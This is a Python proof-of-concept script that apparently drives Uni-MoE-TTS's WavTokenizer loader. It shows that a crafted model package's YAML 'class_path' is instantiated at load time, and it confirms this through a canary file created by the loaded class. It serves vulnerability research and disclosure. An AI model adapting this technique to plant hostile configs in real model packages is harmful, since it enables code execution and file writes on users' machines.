"""Victim-side harness for the Uni-MoE-TTS WavTokenizer YAML class_path flaw.

Reproduces the exact tail of Uni-MoE-TTS inference/infer_utils.py:load_all_models()
(pinned commit 6f18a7aedfdc):

    config_path = os.path.join(model_path,
        "wavtokenizer_smalldata_frame40_3s_nq1_code4096_dim512_kmeans200_attn.yaml")
    model_path  = os.path.join(model_path,
        "wavtokenizer_large_unify_600_24k.ckpt")
    wavtokenizer = WavTokenizer.from_pretrained0802(config_path, model_path)

(load_all_models additionally loads speech_gen_ep2.bin and qwen_pp first; those
assets are not needed to reach this sink, so this harness drives it directly.)

Usage:  python run_poc.py model_pkg_positive
        python run_poc.py model_pkg_negative
"""

import os
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
SRC = HERE / "Uni-MoE-6f18a7ae" / "inference"

YAML_NAME = "wavtokenizer_smalldata_frame40_3s_nq1_code4096_dim512_kmeans200_attn.yaml"
CKPT_NAME = "wavtokenizer_large_unify_600_24k.ckpt"
CANARY = HERE / "pwned_unimoetts_canary.txt"


def main():
    pkg = Path(sys.argv[1]) if len(sys.argv) > 1 else None
    if pkg is None or not pkg.is_dir():
        print("usage: python run_poc.py <model_pkg_dir>")
        return 2

    # make the side-effect check meaningful: remove any leftover canary first
    if CANARY.exists():
        CANARY.unlink()

    # import decoder.* exactly as Uni-MoE-TTS inference code does
    sys.path.insert(0, str(SRC))

    print(f"[*] target sink : Uni-MoE-TTS/inference/decoder/pretrained.py:88 "
          f"-> instantiate_class (lines 13-29)")
    print(f"[*] model dir   : {pkg}")

    config_path = os.path.join(str(pkg), YAML_NAME)   # same joins as infer_utils.py
    ckpt_path = os.path.join(str(pkg), CKPT_NAME)
    print(f"[*] config_path = os.path.join(model_dir, {YAML_NAME})")
    print(f"[*] ckpt_path   = os.path.join(model_dir, {CKPT_NAME})")

    with open(config_path, "r", encoding="utf-8") as f:
        import yaml
        cfg = yaml.safe_load(f)
    fe = cfg["model"]["init_args"]["feature_extractor"]
    print(f"[*] YAML feature_extractor.class_path = {fe['class_path']!r}  "
          f"(init_args: {fe['init_args']})")

    from decoder.pretrained import WavTokenizer

    print("[*] calling WavTokenizer.from_pretrained0802(config_path, ckpt_path) ...")
    err = None
    try:
        WavTokenizer.from_pretrained0802(config_path, ckpt_path)
    except Exception as e:  # expected: empty state_dict has none of the model's keys
        err = e

    if err is not None:
        first = str(err).splitlines()[0] if str(err) else repr(err)
        print(f"[!] from_pretrained0802 raised: {type(err).__name__}: {first}")
        print("    (raised at checkpoint load_state_dict, AFTER YAML instantiation;")
        print("     torch.load used weights_only=True at pretrained.py:101 -> the")
        print("     checkpoint is not the vector; the YAML class_path already ran)")

    landed = CANARY.exists()
    print(f"[*] side-effect check: {CANARY.name} exists -> {landed}")

    class_path = fe["class_path"]
    if landed:
        print(f"[+] EFFECT CONFIRMED: class_path leaf {class_path!r} was imported and")
        print(f"    instantiated at load time; file created: {CANARY}")
        print(f"    (init_args.filename is package-controlled -> arbitrary file creation)")
        return 0
    else:
        print(f"[-] NEGATIVE CONTROL: {class_path!r} was still imported and instantiated,")
        print(f"    but produced no file - effect tracks the class_path leaf only")
        return 1


if __name__ == "__main__":
    sys.exit(main())
